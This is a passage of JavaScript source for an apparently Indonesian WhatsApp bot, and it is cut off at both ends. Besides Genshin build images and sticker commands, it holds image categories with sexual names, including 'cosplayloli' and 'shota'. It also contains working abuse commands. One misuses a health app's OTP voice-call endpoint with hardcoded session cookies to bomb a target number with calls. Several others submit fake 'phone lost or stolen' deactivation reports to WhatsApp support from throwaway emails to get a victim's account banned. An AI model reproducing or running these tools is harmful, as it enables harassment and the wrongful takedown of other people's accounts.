                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaeya_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'ayaka') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kamisato Ayaka_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'hutao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Hu Tao_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'ayato') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kamisato Ayato_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kaveh') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaveh_Driver.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'keqing') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Keqing_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Keqing_Electro_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kirara') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kirara_Shielder.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'klee') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Klee_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kokomi') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kokomi_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kujosara') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kujo Sara_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kuki') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kuki Shinobu_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'layla') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Layla_Shielder.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'lisa') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Lisa_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'mika') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Mika_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'mona') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Mona_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Mona_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'nahida') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Nahida_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'nilou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Nilou_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'ningguang') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Ningguang_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'noelle') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Noelle_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'qiqi') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Qiqi_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'raiden') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Raiden Shogun_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'razor') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Razor_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'rosaria') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Rosaria_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Rosaria_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'sayu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Sayu_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'shenhe') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Shenhe_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'haizou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Shikanoin Heizou_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'sucrose') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Sucrose_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'childe') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Tartaglia_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'thoma') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Thoma_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'tighnari') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Tighnari_Driver.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'mc') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Anemo_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Dendro_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Electro_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Geo_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Traveler_Hydro_Sub%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'venti') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Venti_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'wanderer') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Wanderer_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xiangling') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xiangling_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xiangling_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xiao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xiao_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xingqiu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xingqiu_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xingyan') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xinyan_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yaemiko') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yae Miko_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yae Miko_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yanfei') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yanfei_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yaoyao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yaoyao_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yelan') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yelan_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yoimiya') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yoimiya_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yunjin') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yun Jin_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'zhongli') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Zhongli_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Zhongli_Shielder.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
               } else if (args[0] === 'lyney') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Lyney_Main%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
} else if (args[0] === 'lynette') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Lynette_Support.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
} else if (args[0] === 'freminet') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Freminet_Main%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
            } else if (args[0] === 'list') {
            qyuunee.sendMessage(m.chat, {
                    text:  `▧ 「 *LIST CHARACTER FEMALE* 」\n\n- Aloy\n- Amber\n- Ayaka\n- Barbara\n- Beidou\n- Candace\n- Collei\n- Dehya\n- Diona\n- Dori\n- Eula\n- Faruzan\n- Fischl\n- Ganyu\n- HuTao\n- Jean\n- Keqing\n- Klee\n- Kujou Sara\n- Kokomi\n- Layla\n- Lisa\n- Lynette\n- Mona\n- Nahida\n- Nilou\n- Ningguang\n- Noelle\n- Qiqi\n- Raiden\n- Rosaria\n- KujoSara\n- Sayu\n- Shenhe\n- Shinobu\n- Sucrose\n- Xiangling\n- Xinyan\n- YaeMiko\n- Yanfei\n- Yaoyao\n- Yelan\n- Yoimiya\n- YunJin\n\n▧ 「 *LIST CHARACTER MALE* 」\n\n- Albedo\n- Alhaitham\n- Ayato\n- Baizhu\n- Bennett\n- Chongyun\n- Cyno\n- Diluc\n- Freminet\n- Gorou\n- Heizou\n- Itto\n- Kaeya\n- Kaveh\n- Kazuha\n- Lyney\n- Mika\n- Razor\n- Tartaglia\n- Thoma\n- Tighnari\n- Venti\n- Wanderer\n- Xiao\n- Xingqiu\n- Zhongli`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: '▧ 「 PAKE HURUF KECIL SEMUA 」',
                            thumbnailUrl: 'https://telegra.ph/file/f05438817a1d796a9b7e3.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            }
            break

case "owner": {
const repf = await qyuunee.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
qyuunee.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case 'hapus': 
            case 'delete': 
            case 'del': 
            case 'd': {
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return reply('Pesan tersebut bukan dikirim oleh bot!')
                qyuunee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'join': {
if (!isOwner) return reply(mess.only.owner)
                if (!text) return 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
                reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await qyuunee.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
        }
        break
        
        case 'leave': {
                if (!isOwner) return reply(mess.only.owner)
                reply("👋🏻 Sayonara Minasan~")
                await qyuunee.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
        }
        break
case "aesthetic": case "ahegao": case "akira": case "akiyama": case "ana": case "anjing": case "art2": case "ass": case "asuna": case "ayuzawa": case "bdsm": case "boneka": case "boruto": case "bts": case "cecan2": case "chiho": case "chitoge": case "cogan2": case "cosplay": case "cosplayloli": case "cosplaysagiri": case "cuckold": case "cum": case "cyber": case "darkjokes": case "deidara": case "doraemon": case "eba": case "elaina": case "emilia": case "ero": case "erza": case "exo": case "femdom": case "foot": case "freefire": case "gamewallpaper": case "gangbang": case "glasses": case "gremory": case "hekel": case "hentai": case "hestia": case "hijaber": case "hinata": case "husbu": case "inori": case "islamic": case "isuzu": case "itachi": case "itori": case "jahy": case "jeni": case "jiso": case "justina": case "kaga": case "kagura": case "kakasih": case "kaori": case "kartun": case "katakata": case "keneki": case "kotori": case "kpop": case "kucing": case "kurumi": case "lisa": case "madara": case "masturbation": case "megumin": case "mikasa": case "mikey": case "miku": case "milf": case "minato": case "mobil": case "motor": case "mountain": case "naruto": case "neko1": case "neko2": case "nekonime": case "nezuko": case "onepiece": case "orgy": case "panties": case "pentol": case "pokemon": case "profil": case "programming": case "pubg": case "pussy": case "quotesyt": case "randblackpink": case "randomnime": case "randomnime2": case "rize": case "rose": case "ryujin": case "sagiri": case "sakura": case "sasuke": case "satanic": case "shina": case "shinka": case "shinomiya": case "shizuka": case "shota": case "tatasurya": case "technology": case "tejina": case "tentacles": case "thighs": case "toukachan": case "tsunade": case "waifu2": case "wallhp": case "wallml": case "wallnime2": case "yotsuba": case "yuki": case "yulibocil": case "yumeko": {
reply(mess.wait)
let asu = require(`./all/database/random/${command}.json`)
var bykay = asu[Math.floor(Math.random() * asu.length)]
await qyuunee.sendMessage(from, { image: { url : bykay }, caption: mess.success }, { quoted : m })
}
break
case "ppcouple": {
let anu = require(`./all/database/random/${command}.json`)
let random = anu[Math.floor(Math.random() * anu.length)]
qyuunee.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: m })
qyuunee.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: m })
}
break
case "halah": case "hilih": case "huluh": case "heleh": case "holoh": {
if (!m.quoted && !text) return reply(`Kirim/Reply Teks Dengan Caption ${prefix + command}`)
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
}
break
case "styletext":{
if (!q) return reply(`Contoh ${prefix+command} koi`)
reply(mess.wait)
let res = await styletext(q)
reply(util.format(res))
}
break
case "ssweb":{
if (!q) return reply(`Contoh ${prefix+command} link`)
reply(mess.wait)
global.sh = q
let krt = await ssweb(global.sh)
qyuunee.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break
case "smeme": {
if (!q) return reply(`Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (isImage) return reply(`Reply Foto Dengan Caption ${prefix + command} *teks*`)
reply(mess.wait)
mee = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
qyuunee.sendStimg(from, kaytid, m, { packname: global.packname, author: global.author })
}
break
case "sticker": case "s": {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await qyuunee.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await qyuunee.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'swm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return reply(`Kirim/Reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return reply(`Kirim/Reply image/video dengan caption ${prefix + command} teks1|teks2`)
                reply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await qyuunee.downloadMediaMessage(qmsg)
                    let encmedia = await qyuunee.sendImageAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
                    let media = await qyuunee.downloadMediaMessage(qmsg)
                    let encmedia = await qyuunee.sendVideoAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
case "cry": case "kill": case "hug": case "pat": case "lick": case "kiss": case "bite": case "yeet": case "bully": case "bonk": case "wink": case "poke": case "nom": case "slap": case "smile": case "wave": case "awoo": case "blush": case "smug": case "glomp": case "happy": case "dance": case "cringe": case "cuddle": case "highfive": case "handhold": {
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
qyuunee.sendStimg(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case "call": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285798145596`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
}
break
case "out": case "verif":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
let prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
